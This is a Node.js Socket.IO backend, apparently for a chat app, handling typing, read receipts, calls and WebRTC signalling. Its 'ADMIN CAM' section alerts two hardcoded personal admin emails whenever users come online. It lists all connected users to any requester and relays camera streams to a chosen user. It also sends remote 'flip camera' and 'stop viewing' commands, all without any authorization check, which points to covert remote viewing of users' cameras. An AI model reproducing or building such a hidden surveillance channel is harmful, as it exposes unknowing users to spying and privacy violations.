      receiverId ? String(receiverId).trim() : null,
      receiverId ? `user:${String(receiverId).trim()}` : null,
    ].filter(Boolean);
    for (const r of targetRooms) {
      if (socket.activeTypingRooms) socket.activeTypingRooms.add(r);
      socket.to(r).emit('user_typing', payload);
    }
  });

  socket.on('stop_typing', ({ receiverEmail, receiverId }) => {
    const payload = { email: socket.userEmail, userId: socket.userId, username: socket.username };
    const targetRooms = [
      receiverEmail ? receiverEmail.toLowerCase().trim() : null,
      receiverEmail ? `user:${receiverEmail.toLowerCase().trim()}` : null,
      receiverId ? String(receiverId).trim() : null,
      receiverId ? `user:${String(receiverId).trim()}` : null,
    ].filter(Boolean);
    for (const r of targetRooms) {
      if (socket.activeTypingRooms) socket.activeTypingRooms.delete(r);
      socket.to(r).emit('user_stop_typing', payload);
    }
  });

  // SEEN
  socket.on('mark_as_seen', async ({ senderEmail, senderId }) => {
    const seenAt = new Date().toISOString();
    const myId = socket.userId;
    const myEmail = socket.userEmail ? socket.userEmail.toLowerCase().trim() : null;

    if (pool && (myId || myEmail) && (senderId || senderEmail)) {
      try {
        const cleanSenderId = senderId ? String(senderId).trim() : '';
        const cleanSenderEmail = senderEmail ? String(senderEmail).toLowerCase().trim() : '';

        await pool.query(`
          UPDATE "SocialMessage"
          SET "isSeen" = true, "seenAt" = NOW()
          WHERE (
            ("receiverId" = $1 OR "receiverId" ILIKE $2) AND
            ("senderId" = $3 OR "senderId" ILIKE $4 OR ($3 = '' AND "senderId" ILIKE $4) OR ($4 = '' AND "senderId" = $3)) AND
            "isSeen" = false
          )
        `, [myId || myEmail, myEmail || myId, cleanSenderId || cleanSenderEmail, cleanSenderEmail || cleanSenderId]);
      } catch (e) {
        console.error('[Socket mark_as_seen DB error]', e.message);
      }
    }

    const targetRooms = [
      senderEmail ? senderEmail.toLowerCase().trim() : null,
      senderEmail ? `user:${senderEmail.toLowerCase().trim()}` : null,
      senderId ? String(senderId).trim() : null,
      senderId ? `user:${String(senderId).trim()}` : null,
    ].filter(Boolean);
    for (const r of targetRooms) {
      socket.to(r).emit('messages_seen', { seenAt });
    }
  });

  // CALLS & WEBRTC
  const emitToCallTarget = (targetEmail, targetUserId, event, payload, targetSocketId) => {
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) {
        targetSocket.emit(event, payload);
        return;
      }
    }
    if (targetEmail) socket.to(targetEmail.toLowerCase().trim()).emit(event, payload);
    if (targetUserId) {
      const idStr = String(targetUserId).trim();
      socket.to(idStr).emit(event, payload);
      socket.to(`user:${idStr}`).emit(event, payload);
    }
  };

  // Helper to emit strictly once per unique socket ID (prevents double/triple packet delivery)
  const emitToSocketsOnce = (socketIdSet, event, payload, excludeId = socket.id) => {
    for (const sid of socketIdSet) {
      if (sid !== excludeId) {
        io.to(sid).emit(event, payload);
      }
    }
  };

  const handleCallRequest = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const now = Date.now();
    const lastCall = callRateLimitMap.get(socket.id);
    if (lastCall && now - lastCall < CALL_RATE_LIMIT_MS) return;
    callRateLimitMap.set(socket.id, now);

    if (!socket.userEmail && !socket.userId) return;

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId),
      ...getRoomSockets(targetUserId ? `user:${targetUserId}` : null)
    ]);
    const isTargetBusy = [...targetSockets].some(sid => activeCalls.has(sid));

    if (isTargetBusy) {
      socket.emit('call_busy', { email: targetEmail, userId: targetUserId, callId: data.callId });
      return;
    }

    if ((targetEmail && targetEmail === socket.userEmail) || (targetUserId && targetUserId === socket.userId)) return;

    const callId = data.callId || `call-${Date.now()}-${Math.random().toString(36).substr(2, 6)}`;
    const payload = { from: { email: socket.userEmail, id: socket.userId, ...data.from }, type: data.type, callId };

    emitToSocketsOnce(targetSockets, 'incoming_call', payload);
  };

  socket.on('call_user', handleCallRequest);
  socket.on('call_request', handleCallRequest);

  const handleCallAccept = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.add(socket.id);
    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId),
      ...getRoomSockets(targetUserId ? `user:${targetUserId}` : null)
    ]);
    targetSockets.forEach(sid => activeCalls.add(sid));

    activeCallInfo.set(socket.id, { callId: data.callId, peerEmail: targetEmail, peerUserId: targetUserId });
    targetSockets.forEach(sid => {
      activeCallInfo.set(sid, { callId: data.callId, peerEmail: socket.userEmail, peerUserId: socket.userId });
    });

    const payload = { from: socket.userEmail || socket.userId, callId: data.callId };
    emitToSocketsOnce(targetSockets, 'call_accepted', payload);
  };

  socket.on('accept_call', handleCallAccept);
  socket.on('call_accept', handleCallAccept);

  const handleCallDecline = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    activeCallInfo.delete(socket.id);

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId),
      ...getRoomSockets(targetUserId ? `user:${targetUserId}` : null)
    ]);
    targetSockets.forEach(sid => {
      activeCalls.delete(sid);
      activeCallInfo.delete(sid);
    });

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    emitToSocketsOnce(targetSockets, 'call_rejected', payload);
  };

  socket.on('reject_call', handleCallDecline);
  socket.on('call_decline', handleCallDecline);

  const handleCallCancel = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    activeCallInfo.delete(socket.id);

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId),
      ...getRoomSockets(targetUserId ? `user:${targetUserId}` : null)
    ]);
    targetSockets.forEach(sid => {
      activeCalls.delete(sid);
      activeCallInfo.delete(sid);
    });

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    emitToSocketsOnce(targetSockets, 'call_cancelled', payload);
  };

  socket.on('call_cancel', handleCallCancel);
  socket.on('call_cancelled', handleCallCancel);

  const handleCallTimeout = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    activeCallInfo.delete(socket.id);

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId),
      ...getRoomSockets(targetUserId ? `user:${targetUserId}` : null)
    ]);
    targetSockets.forEach(sid => {
      activeCalls.delete(sid);
      activeCallInfo.delete(sid);
    });

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    emitToSocketsOnce(targetSockets, 'call_timed_out', payload);
  };

  socket.on('call_timeout', handleCallTimeout);
  socket.on('call_timed_out', handleCallTimeout);

  const handleCallEnd = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    callRateLimitMap.delete(socket.id);
    activeCallInfo.delete(socket.id);

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId),
      ...getRoomSockets(targetUserId ? `user:${targetUserId}` : null)
    ]);
    targetSockets.forEach(sid => {
      activeCalls.delete(sid);
      activeCallInfo.delete(sid);
    });

    const payload = { callId: data.callId };
    emitToSocketsOnce(targetSockets, 'call_ended', payload);
  };

  socket.on('end_call', handleCallEnd);
  socket.on('call_end', handleCallEnd);

  const handleWebRTCSignal = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const targetSocketId = data.targetSocketId;

    const payload = {
      signal: data.signal || data.offer || data.answer || data.candidate || data,
      from: socket.userEmail || socket.userId,
      fromSocketId: socket.id,
      callId: data.callId
    };

    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) {
        targetSocket.emit('webrtc_signal', payload);
        return;
      }
    }

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId),
      ...getRoomSockets(targetUserId ? `user:${targetUserId}` : null)
    ]);
    emitToSocketsOnce(targetSockets, 'webrtc_signal', payload);
  };

  socket.on('webrtc_signal', handleWebRTCSignal);
  socket.on('offer', handleWebRTCSignal);
  socket.on('answer', handleWebRTCSignal);
  socket.on('ice_candidate', (data) => {
    handleWebRTCSignal({ ...data, signal: { candidate: data.candidate || data } });
  });

  // ADMIN CAM
  const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];
  socket.on('cam_user_online', ({ email, username, userId }) => {
    socket.camEmail = email ? email.toLowerCase().trim() : (socket.userEmail || null);
    socket.camUsername = username || socket.username || email || 'User';
    socket.camUserId = userId || socket.userId;
    socket.camRegistered = true;
    socket.camLastSeen = Date.now();
    if (socket.camUsername) {
      socket.join(`cam_username_${String(socket.camUsername).replace(/^@+/, '').toLowerCase().trim()}`);
    }
    if (socket.camEmail) {
      socket.join('cam_room_' + socket.camEmail);
      socket.join(socket.camEmail);
    }
    if (socket.camUserId) {
      socket.join(`cam_user_${socket.camUserId}`);
      socket.join(`user:${socket.camUserId}`);
    }
    ADMIN_EMAILS.forEach(adminEmail => {
      const payload = {
        email: socket.camEmail,
        username: socket.camUsername,
        userId: socket.camUserId,
        socketId: socket.id
      };
      io.to(adminEmail).emit('cam_user_online_event', payload);
      io.to('cam_room_' + adminEmail).emit('cam_user_online_event', payload);
    });
  });

  socket.on('cam_get_users', () => {
    const userMap = new Map();
    for (const [, s] of io.sockets.sockets) {
      if (!s.connected) continue;
      const email = s.camEmail || s.userEmail;
      if (email) {
        const cleanEmail = email.toLowerCase().trim();
        const username = s.camUsername || s.username || 'User';
        const existing = userMap.get(cleanEmail);
        // Prefer sockets with active camera registration or newer connections
        if (!existing || (s.camRegistered && !existing.camRegistered)) {
          userMap.set(cleanEmail, {
            email: cleanEmail,
            username,
            userId: s.camUserId || s.userId,
            socketId: s.id,
            camRegistered: Boolean(s.camRegistered)
          });
        }
      }
    }
    socket.emit('cam_users_list', Array.from(userMap.values()));
  });

  socket.on('cam_signal', ({ targetSocketId, targetEmail, targetUsername, targetUserId, senderEmail, signal }) => {
    if (!signal) return;
    const fromEmail = socket.camEmail || socket.userEmail || senderEmail;
    if (fromEmail && !socket.camEmail) {
      socket.camEmail = fromEmail.toLowerCase().trim();
      socket.join('cam_room_' + socket.camEmail);
    }
    const payload = {
      fromSocketId: socket.id,
      fromEmail: socket.camEmail || socket.userEmail || senderEmail,
      signal
    };

    const targetSockets = new Set();
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) {
        targetSockets.add(targetSocketId);
      }
    }
    if (targetEmail) {
      const cleanTargetEmail = targetEmail.toLowerCase().trim();
      getRoomSockets('cam_room_' + cleanTargetEmail).forEach(sid => targetSockets.add(sid));
      getRoomSockets(cleanTargetEmail).forEach(sid => targetSockets.add(sid));
    }
    if (targetUsername) {
      const cleanTargetUser = String(targetUsername).replace(/^@+/, '').toLowerCase().trim();
      getRoomSockets(`cam_username_${cleanTargetUser}`).forEach(sid => targetSockets.add(sid));
    }
    if (targetUserId) {
      getRoomSockets(`cam_user_${targetUserId}`).forEach(sid => targetSockets.add(sid));
      getRoomSockets(`user:${targetUserId}`).forEach(sid => targetSockets.add(sid));
    }

    emitToSocketsOnce(targetSockets, 'cam_signal', payload);
  });

  socket.on('cam_flip_camera', ({ targetSocketId, targetEmail, targetUsername }) => {
    const payload = { fromSocketId: socket.id };
    const targetSockets = new Set();
    if (targetSocketId && io.sockets.sockets.get(targetSocketId)?.connected) {
      targetSockets.add(targetSocketId);
    }
    if (targetEmail) {
      const clean = targetEmail.toLowerCase().trim();
      getRoomSockets('cam_room_' + clean).forEach(sid => targetSockets.add(sid));
      getRoomSockets(clean).forEach(sid => targetSockets.add(sid));
    }
    if (targetUsername) {
      const cleanUser = String(targetUsername).replace(/^@+/, '').toLowerCase().trim();
      getRoomSockets(`cam_username_${cleanUser}`).forEach(sid => targetSockets.add(sid));
    }
    emitToSocketsOnce(targetSockets, 'cam_flip_camera', payload);
  });

  socket.on('cam_stop_viewing', ({ targetSocketId, targetEmail, targetUsername }) => {
    const payload = { fromSocketId: socket.id };
    const targetSockets = new Set();
    if (targetSocketId && io.sockets.sockets.get(targetSocketId)?.connected) {
      targetSockets.add(targetSocketId);
    }
    if (targetEmail) {
      const clean = targetEmail.toLowerCase().trim();
      getRoomSockets('cam_room_' + clean).forEach(sid => targetSockets.add(sid));
      getRoomSockets(clean).forEach(sid => targetSockets.add(sid));
    }
    if (targetUsername) {
      const cleanUser = String(targetUsername).replace(/^@+/, '').toLowerCase().trim();
      getRoomSockets(`cam_username_${cleanUser}`).forEach(sid => targetSockets.add(sid));
    }
    emitToSocketsOnce(targetSockets, 'cam_stop_viewing', payload);
  });

  // DISCONNECT
  socket.on('disconnect', () => {
    const callInfo = activeCallInfo.get(socket.id);
    if (callInfo) {
      const payload = { callId: callInfo.callId, by: socket.userEmail || socket.userId };
      const peerSockets = new Set([
        ...getRoomSockets(callInfo.peerEmail),
        ...getRoomSockets(callInfo.peerUserId),
        ...getRoomSockets(callInfo.peerUserId ? `user:${callInfo.peerUserId}` : null)
      ]);
      emitToSocketsOnce(peerSockets, 'call_ended', payload);
      activeCallInfo.delete(socket.id);
    }

    activeCalls.delete(socket.id);
    callRateLimitMap.delete(socket.id);
    heartbeatMap.delete(socket.id);

    // Clean up any remaining typing indicators for this socket
    if (socket.activeTypingRooms && socket.activeTypingRooms.size > 0) {
      const payload = { email: socket.userEmail, userId: socket.userId, username: socket.username };
      for (const r of socket.activeTypingRooms) {
        socket.to(r).emit('user_stop_typing', payload);
      }
      socket.activeTypingRooms.clear();
    }

    if (socket.camRegistered || socket.userEmail) {
      ADMIN_EMAILS.forEach(adminEmail => {
        const hasAnotherCameraSocket = [...io.sockets.sockets.values()].some(other =>
          other.id !== socket.id &&
          other.connected &&
          (other.camEmail || other.userEmail) === (socket.camEmail || socket.userEmail)
        );
        if (!hasAnotherCameraSocket) {
          io.to(adminEmail).emit('cam_user_offline', { socketId: socket.id });
          io.to('cam_room_' + adminEmail).emit('cam_user_offline', { socketId: socket.id });
        }
      });
    }

    const roomsToClean = [socket.userEmail, socket.userId].filter(Boolean);
    let wentOffline = false;

    roomsToClean.forEach(room => {
      const sockets = onlineUsers.get(room);
      if (sockets) {
        sockets.delete(socket.id);
        if (sockets.size === 0) {
          onlineUsers.delete(room);
          wentOffline = true;
        }
      }
    });

    if (wentOffline) {
      broadcastActivityUpdate(socket.userId, socket.userEmail, false, new Date().toISOString());
      broadcastOnlineUsers();
    }
  });
});

const PORT = process.env.PORT || 8080;
httpServer.listen(PORT, '0.0.0.0', () => {
  console.log(`>>> Connect Backend & Realtime Server listening on port ${PORT}`);
  console.log(`>>> Allowed Origins: ${process.env.CLIENT_URL || '*'}`);
  console.log(`>>> Database Pool: ${pool ? 'Connected' : 'Not configured'}`);
});
